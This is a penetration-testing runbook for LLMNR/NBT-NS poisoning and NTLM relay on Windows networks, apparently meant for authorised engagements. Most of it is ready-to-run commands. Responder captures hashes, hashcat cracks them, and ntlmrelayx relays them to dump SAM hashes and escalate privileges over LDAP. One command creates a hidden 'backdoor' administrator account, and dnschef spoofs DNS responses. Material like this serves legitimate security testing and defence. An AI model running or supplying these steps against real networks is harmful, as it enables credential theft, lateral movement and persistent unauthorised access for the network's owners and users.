# Runbook: Name resolution attacks

## Objective

Capture NTLM credential hashes through LLMNR/NBT-NS poisoning, then relay them for authenticated access to other hosts or crack them offline.

## Prerequisites

- Access to the target Windows network segment.
- Responder and ntlmrelayx from Impacket.
- A list of potential relay targets (hosts where the captured user has local admin rights).

## Phase 1: Identify relay targets

Before starting Responder, enumerate hosts where SMB signing is not enforced:

```bash
nmap -p 445 --script smb2-security-mode 192.168.1.0/24 | grep -B5 'signing enabled and not required'
```

Build a list of relay targets (hosts where signing is not required):

```bash
nmap -p 445 --script smb2-security-mode 192.168.1.0/24 -oG - | grep 'signing enabled and not required' | awk '{print $2}' > relay-targets.txt
```

## Phase 2: Capture hashes with Responder

If the objective is hash capture and offline cracking rather than relay:

```bash
responder -I eth0 -rdw
```

Responder listens for LLMNR, NBT-NS, and mDNS queries and responds to all of them, capturing authentication attempts to the following default services: SMB, HTTP, HTTPS, FTP, LDAP, MSSQL. Captured hashes are written to `/usr/share/responder/logs/`.

Wait for hashes: in an active Windows environment with any browsing or file access activity, hashes typically appear within minutes. SMB connection attempts to non-existent shares, and browser name resolution failures, are particularly reliable triggers.

Crack captured NTLMv2 hashes:

```bash
hashcat -m 5600 /usr/share/responder/logs/*.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## Phase 3: NTLM relay

For relay, disable Responder's SMB and HTTP servers so they do not capture but do not relay:

Edit `/etc/responder/Responder.conf`:

```
SMB = Off
HTTP = Off
```

Start Responder to poison name resolution without capturing:

```bash
responder -I eth0 -rdw
```

Start ntlmrelayx targeting the list of unsigned SMB hosts:

```bash
ntlmrelayx.py -tf relay-targets.txt -smb2support
```

When a victim authenticates (triggered by LLMNR/NBT-NS poisoning), ntlmrelayx relays the authentication to each target in the list. On hosts where the victim user has local admin, ntlmrelayx automatically dumps SAM hashes.

For LDAP relay to perform domain operations:

```bash
ntlmrelayx.py -t ldap://<DC-IP> --escalate-user <username>
```

For executing a specific command on a relay target:

```bash
ntlmrelayx.py -tf relay-targets.txt -smb2support -c 'net user backdoor P@ssw0rd /add && net localgroup administrators backdoor /add'
```

## Phase 4: DNS manipulation

If the position allows injecting DNS responses:

```bash
# Responder handles DNS poisoning automatically with -d flag
# For targeted DNS poisoning, dnschef provides more control
dnschef --fakeip 192.168.1.100 --fakedomains target.corp
```

## Evidence collection

Record: hashes captured (sanitised, noting user accounts and source hosts), relay targets that accepted authentication, SAM hashes or command execution results from successful relays, and cracked credentials.
